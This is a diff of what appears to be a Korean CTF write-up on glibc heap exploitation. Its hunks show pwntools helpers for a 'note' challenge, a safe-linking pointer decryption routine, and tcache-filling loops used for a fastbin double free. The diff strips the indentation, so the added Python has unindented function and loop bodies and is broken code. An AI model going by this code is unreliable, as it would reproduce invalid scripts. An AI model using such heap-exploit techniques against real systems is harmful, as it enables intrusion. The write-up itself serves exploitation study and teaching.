@@ -146,27 +146,27 @@ https://github.com/shellphish/how2heap/blob/master/glibc_2.32/decrypt_safe_linki
 
 def decrypt(cipher):
 
-&nbsp;   key = 0
+key = 0
 
-&nbsp;   plain = 0
-
-
-
-&nbsp;   for i in range(1, 6):
-
-&nbsp;       bits = 64-12*i
-
-&nbsp;       if bits < 0:
-
-&nbsp;           bits = 0
-
-&nbsp;       plain = ((cipher ^ key) >> bits) << bits
-
-&nbsp;       key = plain >> 12
+plain = 0
 
 
 
-&nbsp;   return plain
+for i in range(1, 6):
+
+    bits = 64-12*i
+
+    if bits < 0:
+
+        bits = 0
+
+    plain = ((cipher ^ key) >> bits) << bits
+
+    key = plain >> 12
+
+
+
+return plain
 
 ```
 
@@ -206,79 +206,79 @@ elf = ELF("./note")
 
 def create(idx, size, data):
 
-&nbsp;   p.sendline(b'1')
+p.sendline(b'1')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.sendlineafter(b'size: ', str(size).encode())
+p.sendlineafter(b'size: ', str(size).encode())
 
-&nbsp;   p.sendafter(b'data: ', data)
+p.sendafter(b'data: ', data)
 
 
 
 def read_note(idx):
 
-&nbsp;   p.sendline(b'2')
+p.sendline(b'2')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.recvuntil(b"data: ")
+p.recvuntil(b"data: ")
 
-&nbsp;   leak = p.recvline().strip()
+leak = p.recvline().strip()
 
-&nbsp;   return leak
+return leak
 
 
 
 def update(idx, data):
 
-&nbsp;   p.sendline(b'3')
+p.sendline(b'3')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.sendafter(b'data: ', data)
+p.sendafter(b'data: ', data)
 
 
 
 def delete(idx):
 
-&nbsp;   p.sendline(b'4')
+p.sendline(b'4')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
 
 
 def decrypt(cipher):
 
-&nbsp;   key = 0
+key = 0
 
-&nbsp;   plain = 0
-
-
-
-&nbsp;   for i in range(1, 6):
-
-&nbsp;       bits = 64-12*i
-
-&nbsp;       if bits < 0:
-
-&nbsp;           bits = 0
-
-&nbsp;       plain = ((cipher ^ key) >> bits) << bits
-
-&nbsp;       key = plain >> 12
+plain = 0
 
 
 
-&nbsp;   return plain
+for i in range(1, 6):
+
+    bits = 64-12*i
+
+    if bits < 0:
+
+        bits = 0
+
+    plain = ((cipher ^ key) >> bits) << bits
+
+    key = plain >> 12
+
+
+
+return plain
 
 
 
 for _ in range(7):
 
-&nbsp;   create(9, 0x30, b'a')
+create(9, 0x30, b'a')
 
-&nbsp;   delete(9)
+delete(9)
 
 
 
@@ -370,9 +370,9 @@ fastbin의 특성상 중복된 주소가 리스트에 두 번 들어가게 되�
 
 typedef struct {
 
-&nbsp;   size_t size;
+size_t size;
 
-&nbsp;   char *data;
+char *data;
 
 } Note;
 
@@ -624,71 +624,71 @@ elf = ELF("./note")
 
 def create(idx, size, data):
 
-&nbsp;   p.sendline(b'1')
+p.sendline(b'1')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.sendlineafter(b'size: ', str(size).encode())
+p.sendlineafter(b'size: ', str(size).encode())
 
-&nbsp;   p.sendafter(b'data: ', data)
+p.sendafter(b'data: ', data)
 
 
 
 def read_note(idx):
 
-&nbsp;   p.sendline(b'2')
+p.sendline(b'2')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.recvuntil(b"data: ")
+p.recvuntil(b"data: ")
 
-&nbsp;   leak = p.recvline().strip()
+leak = p.recvline().strip()
 
-&nbsp;   return leak
+return leak
 
 
 
 def update(idx, data):
 
-&nbsp;   p.sendline(b'3')
+p.sendline(b'3')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
-&nbsp;   p.sendafter(b'data: ', data)
+p.sendafter(b'data: ', data)
 
 
 
 def delete(idx):
 
-&nbsp;   p.sendline(b'4')
+p.sendline(b'4')
 
-&nbsp;   p.sendlineafter(b'idx: ', str(idx).encode())
+p.sendlineafter(b'idx: ', str(idx).encode())
 
 
 
 def decrypt(cipher):
 
-&nbsp;   key = 0
+key = 0
 
-&nbsp;   plain = 0
-
-
-
-&nbsp;   for i in range(1, 6):
-
-&nbsp;       bits = 64-12*i
-
-&nbsp;       if bits < 0:
-
-&nbsp;           bits = 0
-
-&nbsp;       plain = ((cipher ^ key) >> bits) << bits
-
-&nbsp;       key = plain >> 12
+plain = 0
 
 
 
-&nbsp;   return plain
+for i in range(1, 6):
+
+    bits = 64-12*i
+
+    if bits < 0:
+
+        bits = 0
+
+    plain = ((cipher ^ key) >> bits) << bits
+
+    key = plain >> 12
+
+
+
+return plain
 
 
 
@@ -698,9 +698,9 @@ create(7, 0x70, b'a')
 
 for _ in range(7):
 
-&nbsp;   create(9, 0x60, b'a')
+create(9, 0x60, b'a')
 
-&nbsp;   delete(9)
+delete(9)
 
 
 
